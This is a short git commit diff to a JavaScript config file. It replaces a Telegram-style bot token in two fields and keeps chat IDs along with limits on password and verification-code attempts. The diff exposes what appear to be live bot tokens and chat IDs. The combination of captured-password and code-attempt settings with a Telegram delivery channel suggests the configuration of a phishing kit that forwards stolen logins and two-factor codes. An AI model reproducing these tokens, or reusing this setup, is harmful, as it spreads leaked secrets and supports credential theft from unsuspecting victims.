b565b114a8e27a0d316681ec451410e9ee02f05c
nghiaquanh29-cell <nghiaquanh29@gmail.com>
2025-09-03 11:11:34 +0700

    Update config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,7 +1,7 @@
 const config = {
-    token: '8222641211:AAF5R3ovIxlco3jZOmBaj30Trg67JOwJaT4',
+    token: '8211768196:AAGFzmurfaCyTSgn1_Umk0037UkoPySBHBM',
     chat_id: '-4927053147',
-    noti_token: '8222641211:AAF5R3ovIxlco3jZOmBaj30Trg67JOwJaT4',
+    noti_token: '8211768196:AAGFzmurfaCyTSgn1_Umk0037UkoPySBHBM',
     noti_chat_id: '-4807362734',
     max_password_attempts: 2,
     max_code_attempts: 5,
